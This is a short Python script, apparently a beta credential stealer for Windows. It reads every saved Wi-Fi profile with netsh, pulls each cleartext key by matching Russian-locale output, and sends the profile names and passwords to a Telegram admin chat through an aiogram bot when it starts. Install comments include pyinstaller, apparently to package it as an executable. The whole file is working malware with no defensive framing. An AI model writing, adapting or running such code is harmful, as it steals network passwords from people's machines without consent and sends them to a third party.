# !! BETA !! #

# pip install chardet==5.0.0
# pip install aiogram==2.22.2
# pip install pyinstaller

import subprocess
from chardet import detect
from aiogram import Dispatcher, Bot, types, executor

bot = Bot(token="", parse_mode="html")
admin_id = 
dp = Dispatcher(bot)


async def extract_wifi_passwords(m: types.Message):
    try:
        qwe = detect(subprocess.check_output('netsh wlan show profiles'))['encoding']
        profiles_data = subprocess.check_output('netsh wlan show profiles').decode(qwe).split("\n")
        profiles = [i.split(':')[1].strip() for i in profiles_data if 'Все профили пользователей' in i]

        for profile in profiles:
            profile_info = subprocess.check_output(f'netsh wlan show profile {profile} key=clear').decode(qwe).split('\n')

            try:
                password = [i.split(':')[1].strip() for i in profile_info if 'Содержимое ключа' in i][0]
            except IndexError:
                password = None

            await bot.send_message(admin_id, f'Profile: {profile}\nPassword: {password}\n{"#" * 20}')
    except subprocess.CalledProcessError:
        pass

if __name__ == "__main__":
    executor.start_polling(dp, on_startup=extract_wifi_passwords)
